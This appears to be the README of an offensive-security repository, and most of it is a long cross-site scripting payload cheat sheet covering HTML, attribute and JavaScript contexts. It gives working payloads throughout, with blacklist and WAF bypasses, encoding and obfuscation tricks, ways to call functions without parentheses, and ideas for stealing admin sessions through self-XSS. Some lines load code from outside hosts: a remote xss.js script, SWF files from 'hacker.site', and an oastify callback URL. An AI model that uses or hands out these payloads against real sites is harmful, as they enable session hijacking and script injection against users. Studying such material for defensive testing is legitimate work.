# Languages 
- Python (.py)

# Malicious Scripts
- CSRF scripts (.html)
- XSS (.js)
- SQLi (.py)
- XXE (.py)
- Bruteforce (.py)
# Payloads
## XXE

## XXS
Raw HTML

If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: <img , <iframe , <svg , <script ... these are just some of the many possible HTML tags you could use.
Also, keep in mind Client Side Template Injection.
Inside HTML tags attribute

If your input is reflected inside the value of the attribute of a tag you could try:

    To escape from the attribute and from the tag (then you will be in the raw HTML) and create new HTML tag to abuse: "><img [...]

    If you can escape from the attribute but not from the tag (> is encoded or deleted), depending on the tag you could create an event that executes JS code: " autofocus onfocus=alert(1) x="

    If you cannot escape from the attribute (" is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example, if you control an event like onclick= you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute href, where you can use the javascript: protocol to execute arbitrary code: 
    href="javascript:alert(1)"

    If your input is reflected inside "unexpoitable tags" you could try the 
    accesskey
     trick to abuse the vuln (you will need some kind of social engineer to exploit this): 
    " accesskey="x" onclick="alert(1)" x="

Weird example of Angular executing XSS if you controls a class name:

<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>

Inside JavaScript code

In this case your input is reflected between 
<script> [...] </script>
 tags of a HTML page, inside a .js file or inside an attribute using 
javascript:
 protocol:

    If reflected between 
    <script> [...] </script>
     tags, even if your input if inside any kind of quotes, you can try to inject </script> and escape from this context. This works because the browser will first parse the HTML tags and then the content, therefore, it won't notice that your injected </script> tag is inside the HTML code.

    If reflected inside a JS string and the last trick isn't working you would need to exit the string, execute your code and reconstruct the JS code (if there is any error, it won't be executed:

        '-alert(1)-'

        ';-alert(1)//

        \';alert(1)//

    If reflected inside template literals you can embed JS expressions using ${ ... } syntax: var greetings = `Hello, ${alert(1)}`

    Unicode encode works to write valid javascript code:

\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)

Javascript Hoisting

Javascript Hoisting references the opportunity to declare functions, variables or classes after they are used so you can abuse scenarios where a XSS is using undeclared variables or functions.
Check the following page for more info:
JS Hoisting
Javascript Function

Several web pages have endpoints that accept as parameter the name of the function to execute. A common example to see in the wild is something like: ?callback=callbackFunc.

A good way to find out if something given directly by the user is trying to be executed is modifying the param value (for example to 'Vulnerable') and looking in the console for errors like:

In case it's vulnerable, you could be able to trigger an alert just doing sending the value: 
?callback=alert(1)
. However, it' very common that this endpoints will validate the content to only allow letters, numbers, dots and underscores (
[\w\._]
).

However, even with that limitation it's still possible to perform some actions. This is because you can use that valid chars to access any element in the DOM:

Some useful functions for this:

firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement

You can also try to trigger Javascript functions directly: obj.sales.delOrders.

However, usually the endpoints executing the indicated function are endpoints without much interesting DOM, other pages in the same origin will have a more interesting DOM to perform more actions.

Therefore, in order to abuse this vulnerability in a different DOM the Same Origin Method Execution (SOME) exploitation was developed:
SOME - Same Origin Method Execution
DOM

There is JS code that is using unsafely some data controlled by an attacker like location.href . An attacker, could abuse this to execute arbitrary JS code.
DOM XSS
Universal XSS

These kind of XSS can be found anywhere. They not depend just on the client exploitation of a web application but on any context. These kind of arbitrary JavaScript execution can even be abuse to obtain RCE, read arbitrary files in clients and servers, and more.
Some examples:
Server Side XSS (Dynamic PDF)
Electron Desktop Apps
WAF bypass encoding image
from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21
Injecting inside raw HTML

When your input is reflected inside the HTML page or you can escape and inject HTML code in this context the first thing you need to do if check if you can abuse < to create new tags: Just try to reflect that char and check if it's being HTML encoded or deleted of if it is reflected without changes. Only in the last case you will be able to exploit this case.
For this cases also keep in mind Client Side Template Injection.
Note: A HTML comment can be closed using**** 
-->
 or ****
--!>

In this case and if no black/whitelisting is used, you could use payloads like:

<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>

But, if tags/attributes black/whitelisting is being used, you will need to brute-force which tags you can create.
Once you have located which tags are allowed, you would need to brute-force attributes/events inside the found valid tags to see how you can attack the context.
Tags/Events brute-force

Go to https://portswigger.net/web-security/cross-site-scripting/cheat-sheet and click on Copy tags to clipboard. Then, send all of them using Burp intruder and check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags (in the same web page click on Copy events to clipboard and follow the same procedure as before).
Custom tags

If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the onfocus attribute. In the XSS request, you need to end the URL with # to make the page focus on that object and execute the code:

/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x

Blacklist Bypasses

If some kind of blacklist is being used you could try to bypass it with some silly tricks:

//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //

Length bypass (small XSSs)

More tiny XSS for different environments payload can be found here and here.

<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``>
<script src=//aa.es>
<script src=//℡㏛.pw>

The last one is using 2 unicode characters which expands to 5: telsr
More of these characters can be found here.
To check in which characters are decomposed check here.
Click XSS - Clickjacking

If in order to exploit the vulnerability you need the user to click a link or a form with prepopulated data you could try to abuse Clickjacking (if the page is vulnerable).
Impossible - Dangling Markup

If you just think that it's impossible to create an HTML tag with an attribute to execute JS code, you should check Danglig Markup because you could exploit the vulnerability without executing JS code.
Injecting inside HTML tag
Inside the tag/escaping from attribute value

If you are in inside a HTML tag, the first thing you could try is to escape from the tag and use some of the techniques mentioned in the previous section to execute JS code.
If you cannot escape from the tag, you could create new attributes inside the tag to try to execute JS code, for example using some payload like (note that in this example double quotes are use to escape from the attribute, you won't need them if your input is reflected directly inside the tag):

" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t

Style events

<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>

Within the attribute

Even if you cannot escape from the attribute (" is being encoded or deleted), depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example, if you control an event like onclick= you will be able to make it execute arbitrary code when it's clicked.
Another interesting example is the attribute href, where you can use the javascript: protocol to execute arbitrary code: 
href="javascript:alert(1)"

Bypass inside event using HTML encoding/URL encode

The HTML encoded characters inside the value of HTML tags attributes are decoded on runtime. Therefore something like the following will be valid (the payload is in bold): <a id="author" href="http://none" onclick="var tracker='http://foo?
&apos;-alert(1)-&apos;
';">Go Back </a>

Note that any kind of HTML encode is valid:

//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>

Note that URL encode will also work:

<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>

Bypass inside event using Unicode encode

//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />

Special Protocols Within the attribute

There you can use the protocols 
javascript:
 or 
data:
 in some places to execute arbitrary JS code. Some will require user interaction on some won't.

javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3aalert(1)
java        //Note the new line 
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==

Places where you can inject these protocols

In general the javascript: protocol can be used in any tag that accepts the attribute 
href
 and in most of the tags that accepts the attribute 
src
 (but not <img)

<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf 
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf 
<iframe srcdoc="<svg onload=alert(4);>">

Other obfuscation tricks

In this case the HTML encoding and the Unicode encoding trick from the previous section is also valid as you are inside an attribute.

<a href="javascript:var a='&apos;-alert(1)-&apos;'">

Moreover, there is another nice trick for these cases: Even if your input inside 
javascript:...
 is being URL encoded, it will be URL decoded before it's executed. So, if you need to escape from the string using a single quote and you see that it's being URL encoded, remember that it doesn't matter, it will be interpreted as a single quote during the execution time.

&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>

Note that if you try to use both URLencode + HTMLencode in any order to encode the payload it won't work, but you can mix them inside the payload.

Using Hex and Octal encode with 
javascript:

You can use Hex and Octal encode inside the src attribute of iframe (at least) to declare HTML tags to execute JS:

//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />

Reverse tab nabbing

<a target="_blank" rel="opener"

If you can inject any URL in an arbitrary 
<a href=
 tag that contains the 
target="_blank" and rel="opener"
 attributes, check the following page to exploit this behavior:
Reverse Tab Nabbing
on Event Handlers Bypass

First of all check this page (https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) for useful "on" event handlers.
In case there is some blacklist preventing you from creating this even handlers you can try the following bypasses:

<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B

XSS in "Unexploitable tags" (hidden input, link, canonical, meta)

From here it's now possible to abuse hidden inputs with:

<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle=alert(1)>

And in meta tags:

<!-- Injection inside meta attribute-->
<meta name="apple-mobile-web-app-title" content=""Twitter popover id="newsletter" onbeforetoggle=alert(2) />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>

From here: You can execute an XSS payload inside a hidden attribute, provided you can persuade the victim into pressing the key combination. On Firefox Windows/Linux the key combination is ALT+SHIFT+X and on OS X it is CTRL+ALT+X. You can specify a different key combination using a different key in the access key attribute. Here is the vector:

<input type="hidden" accesskey="X" onclick="alert(1)">

The XSS payload will be something like this: 
" accesskey="x" onclick="alert(1)" x="
Blacklist Bypasses

Several tricks with using different encoding were exposed already inside this section. Go back to learn where can you use:

    HTML encoding (HTML tags)

    Unicode encoding (can be valid JS code): \u0061lert(1)

    URL encoding

    Hex and Octal encoding

    data encoding

Bypasses for HTML tags and attributes

Read the Blacklist Bypasses of the previous section.

Bypasses for JavaScript code

Read the JavaScript bypass blacklist of the following section.
CSS-Gadgets

If you found a XSS in a very small part of the web that requires some kind of interaction (maybe a small link in the footer with an onmouseover element), you can try to modify the space that element occupies to maximize the probabilities of have the link fired.

For example, you could add some styling in the element like: position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5

But, if the WAF is filtering the style attribute, you can use CSS Styling Gadgets, so if you find, for example

    .test {display:block; color: blue; width: 100%}

and

    #someid {top: 0; font-family: Tahoma;}

Now you can modify our link and bring it to the form

    <a href="" id=someid class=test onclick=alert() a="">

This trick was taken from https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703
Injecting inside JavaScript code

In these case you input is going to be reflected inside the JS code of a .js file or between <script>...</script> tags or between HTML events that can execute JS code or between attributes that accepts the javascript: protocol.
Escaping <script> tag

If your code is inserted within <script> [...] var input = 'reflected data' [...] </script> you could easily escape closing the 
<script>
 tag:

</script><img src=1 onerror=alert(document.domain)>

Note that in this example we haven't even closed the single quote. This is because HTML parsing is performed first by the browser, which involves identifying page elements, including blocks of script. The parsing of JavaScript to understand and execute the embedded scripts is only carried out afterward.
Inside JS code

If <> are being sanitised you can still escape the string where your input is being located and execute arbitrary JS. It's important to fix JS syntax, because if there are any errors, the JS code won't be executed:

'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//

Template literals ``

In order to construct strings apart from single and double quotes JS also accepts backticks 
``
 . This is known as template literals as they allow to embedded JS expressions using ${ ... } syntax.
Therefore, if you find that your input is being reflected inside a JS string that is using backticks, you can abuse the syntax ${ ... } to execute arbitrary JS code:

This can be abused using:

`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`

// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop(){return loop}
loop``````````````

Encoded code execution

<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</iframe>">

Unicode Encode JS execution

\u{61}lert(1)
\u0061lert(1)
\u{0061}lert(1)

JavaScript bypass blacklists techniques

Strings

"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))

Special escapes

'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
'\b' //backspace
'\f' //form feed
'\n' //new line
'\r' //carriage return
'\t' //tab
// Any other char escaped is just itself

Space substitutions inside JS code

<TAB>
/**/

JavaScript comments (from JavaScript Comments trick)

//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line

JavaScript new lines (from JavaScript new line trick)

//Javascript interpret as new line these chars:
String.fromCharCode(10); alert('//\nalert(1)') //0x0a
String.fromCharCode(13); alert('//\ralert(1)') //0x0d
String.fromCharCode(8232); alert('//\u2028alert(1)') //0xe2 0x80 0xa8
String.fromCharCode(8233); alert('//\u2029alert(1)') //0xe2 0x80 0xa9

JavaScript whitespaces

log=[];
function funct(){}
  for(let i=0;i<=0x10ffff;i++){
      try{
        eval(`funct${String.fromCodePoint(i)}()`);
        log.push(i);
      }
      catch(e){}
  }
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>

Javascript inside a comment

//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com

JavaScript without parentheses

// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
  // or any DOMXSS sink such as location=name

// Backtips
  // Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

  // To pass several arguments you can use
function btt(){
    console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

  //It's possible to construct a function and call it
Function`x${'alert(1337)'}x```

  // .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
  // This happened in the previous example
  // Change "this" value of call to "1,"
  // match anything with regex /./
  // call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

  // Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
Reflect.apply.call`${navigation.navigate}${navigation}${[name]}`
  // Using Reflect.set to call set any value to a variable
Reflect.set.call`${location}${'href'}${'javascript:alert\x281337\x29'}` // It requires a valid object in the first argument (“location”), a property in the second argument and a value to assign in the third.



// valueOf, toString
  // These operations are called when the object is used as a primitive
  // Because the objet is passed as "this" and alert() needs "window" to be the value of "this", "window" methods are used
valueOf=alert;window+''
toString=alert;window+''


// Error handler
window.onerror=eval;throw"=alert\x281\x29";
onerror=eval;throw"=alert\x281\x29";
<img src=x onerror="window.onerror=eval;throw'=alert\x281\x29'">
{onerror=eval}throw"=alert(1)" //No ";"
onerror=alert //No ";" using new line
throw 1337
  // Error handler + Special unicode separators
eval("onerror=\u2028alert\u2029throw 1337"); 
  // Error handler + Comma separator
  // The comma separator goes through the list and returns only the last element
var a = (1,2,3,4,5,6) // a = 6
throw onerror=alert,1337 // this is throw 1337, after setting the onerror event to alert
throw onerror=alert,1,1,1,1,1,1337
  // optional exception variables inside a catch clause.
try{throw onerror=alert}catch{throw 1}


// Has instance symbol
'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}
'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}
  // The “has instance” symbol allows you to customise the behaviour of the instanceof operator, if you set this symbol it will pass the left operand to the function defined by the symbol.

    https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md

    https://portswigger.net/research/javascript-without-parentheses-using-dommatrix

Arbitrary function (alert) call

//Eval like functions
eval('ale'+'rt(1)')
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Function('ale'+'rt(10)')``;
[].constructor.constructor("alert(document.domain)")``
[]["constructor"]["constructor"]`$${alert()}```
import('data:text/javascript,alert(1)')

//General function executions
`` //Can be use as parenthesis
alert`document.cookie`
alert(document['cookie']) 
with(document)alert(cookie) 
(alert)(1)
(alert(1))in"."
a=alert,a(1)
[1].find(alert)
window['alert'](0)
parent['alert'](1)
self['alert'](2)
top['alert'](3)
this['alert'](4)
frames['alert'](5)
content['alert'](6)
[7].map(alert)
[8].find(alert)
[9].every(alert)
[10].filter(alert)
[11].findIndex(alert)
[12].forEach(alert);
top[/al/.source+/ert/.source](1)
top[8680439..toString(30)](1)
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
$='e'; x='ev'+'al'; x=this[x]; y='al'+$+'rt(1)'; y=x(y); x(y)
x='ev'+'al'; x=this[x]; y='ale'+'rt(1)'; x(x(y))
this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+alert(1),new Array)
globalThis[`al`+/ert/.source]`1`
this[`al`+/ert/.source]`1`
[alert][0].call(this,1)
window['a'+'l'+'e'+'r'+'t']()
window['a'+'l'+'e'+'r'+'t'].call(this,1)
top['a'+'l'+'e'+'r'+'t'].apply(this,[1])
(1,2,3,4,5,6,7,8,alert)(1)
x=alert,x(1)
[1].find(alert)
top["al"+"ert"](1)
top[/al/.source+/ert/.source](1)
al\u0065rt(1)
al\u0065rt`1`
top['al\145rt'](1)
top['al\x65rt'](1)
top[8680439..toString(30)](1)
<svg><animate onbegin=alert() attributeName=x></svg>

DOM vulnerabilities

There is JS code that is using unsafely data controlled by an attacker like location.href . An attacker, could abuse this to execute arbitrary JS code.
Due to the extension of the explanation of DOM vulnerabilities it was moved to this page:
DOM XSS

There you will find a detailed explanation of what DOM vulnerabilities are, how are they provoked, and how to exploit them.
Also, don't forget that at the end of the mentioned post you can find an explanation about DOM Clobbering attacks.
Upgrading Self-XSS
Cookie XSS

If you can trigger a XSS by sending the payload inside a cookie, this is usually a self-XSS. However, if you find a vulnerable subdomain to XSS, you could abuse this XSS to inject a cookie in the whole domain managing to trigger the cookie XSS in the main domain or other subdomains (the ones vulnerable to cookie XSS). For this you can use the cookie tossing attack:
Cookie Tossing

You can find a great abuse of this technique in this blog post.
Sending your session to the admin

Maybe an user can share his profile with the admin and if the self XSS is inside the profile of the user and the admin access it, he will trigger the vulnerability.
Session Mirroring

If you find some self XSS and the web page have a session mirroring for administrators, for example allowing clients to ask for help an in order for the admin to help you he will be seeing what you are seeing in your session but from his session.

You could make the administrator trigger your self XSS and steal his cookies/session.
Other Bypasses
Normalised Unicode

You could check is the reflected values are being unicode normalized in the server (or in the client side) and abuse this functionality to bypass protections. Find an example here.
PHP FILTER_VALIDATE_EMAIL flag Bypass

"><svg/onload=confirm(1)>"@x.y

Ruby-On-Rails bypass

Due to RoR mass assignment quotes are inserted in the HTML and then the quote restriction is bypassed and additoinal fields (onfocus) can be added inside the tag.
Form example (from this report), if you send the payload:

contact[email] onfocus=javascript:alert('xss') autofocus a=a&form_type[a]aaa

The pair "Key","Value" will be echoed back like this:

{" onfocus=javascript:alert(&#39;xss&#39;) autofocus a"=>"a"}

Then, the onfocus attribute will be inserted and XSS occurs.
Special combinations

<iframe/src="data:text/html,<svg onload=alert(1)>">
<input type=image src onerror="prompt(1)">
<svg onload=alert(1)//
<img src="/" =_=" title="onerror='prompt(1)'">
<img src='1' onerror='alert(0)' <
<script x> alert(1) </script 1=2
<script x>alert('XSS')<script y>
<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
<svg////////onload=alert(1)>
<svg id=x;onload=alert(1)>
<svg id=`x`onload=alert(1)>
<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
<script>$=1,alert($)</script>
<script ~~~>confirm(1)</script ~~~>
<script>$=1,\u0061lert($)</script>
<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
<</script/script><script ~~~>\u0061lert(1)</script ~~~>
</style></scRipt><scRipt>alert(1)</scRipt>
<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
<svg><x><script>alert('1'&#41</x>
<iframe src=""/srcdoc='<svg onload=alert(1)>'>
<svg><animate onbegin=alert() attributeName=x></svg>
<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);">
(function(x){this[x+`ert`](1)})`al`
window[`al`+/e/[`ex`+`ec`]`e`+`rt`](2)
document['default'+'View'][`\u0061lert`](3)

XSS with header injection in a 302 response

If you find that you can inject headers in a 302 Redirect response you could try to make the browser execute arbitrary JavaScript. This is not trivial as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.

In this report and this one you can read how you can test several protocols inside the Location header and see if any of them allows the browser to inspect and execute the XSS payload inside the body.
Past known protocols: mailto://, //x:1/, ws://, wss://, empty Location header, resource://.
Only Letters, Numbers and Dots

If you are able to indicate the callback that javascript is going to execute limited to those chars. Read this section of this post to find how to abuse this behaviour.
Valid <script> Content-Types to XSS

(From here) If you try to load a script with a content-type such as application/octet-stream, Chrome will throw following error:

    Refused to execute script from ‘https://uploader.c.hc.lc/uploads/xxx' because its MIME type (‘application/octet-stream’) is not executable, and strict MIME type checking is enabled.

The only Content-Types that will support Chrome to run a loaded script are the ones inside the const 
kSupportedJavascriptTypes
 from https://chromium.googlesource.com/chromium/src.git/+/refs/tags/103.0.5012.1/third_party/blink/common/mime_util/mime_util.cc

const char* const kSupportedJavascriptTypes[] = {
    "application/ecmascript",
    "application/javascript",
    "application/x-ecmascript",
    "application/x-javascript",
    "text/ecmascript",
    "text/javascript",
    "text/javascript1.0",
    "text/javascript1.1",
    "text/javascript1.2",
    "text/javascript1.3",
    "text/javascript1.4",
    "text/javascript1.5",
    "text/jscript",
    "text/livescript",
    "text/x-ecmascript",
    "text/x-javascript",
};

Script Types to XSS

(From here) So, which types could be indicated to load a script?

<script type="???"></script>

The answer is:

    module (default, nothing to explain)

    webbundle: Web Bundles is a feature that you can package a bunch of data (HTML, CSS, JS…) together into a 
    .wbn
     file.

<script type="webbundle">
{
   "source": "https://example.com/dir/subresources.wbn",
   "resources": ["https://example.com/dir/a.js", "https://example.com/dir/b.js", "https://example.com/dir/c.png"]
}
</script>
The resources are loaded from the source .wbn, not accessed via HTTP

    importmap: Allows to improve the import syntax

<script type="importmap">
{
  "imports": {
    "moment": "/node_modules/moment/src/moment.js",
    "lodash": "/node_modules/lodash-es/lodash.js"
  }
}
</script>

<!-- With importmap you can do the following -->
<script>
import moment from "moment";
import { partition } from "lodash";
</script>

This behaviour was used in this writeup to remap a library to eval to abuse it can trigger XSS.

    speculationrules: This feature is mainly to solve some problems caused by pre-rendering. It works like this:

<script type="speculationrules">
{
  "prerender": [
    {"source": "list",
     "urls": ["/page/2"],
     "score": 0.5},
    {"source": "document",
     "if_href_matches": ["https://*.wikipedia.org/**"],
     "if_not_selector_matches": [".restricted-section *"],
     "score": 0.1}
  ]
}
</script>

Web Content-Types to XSS

(From here) The following content types can execute XSS in all browsers:

    text/html

    application/xhtml+xml

    application/xml

    text/xml

    image/svg+xml

    text/plain (?? not in the list but I think I saw this in a CTF)

    application/rss+xml (off)

    application/atom+xml (off)

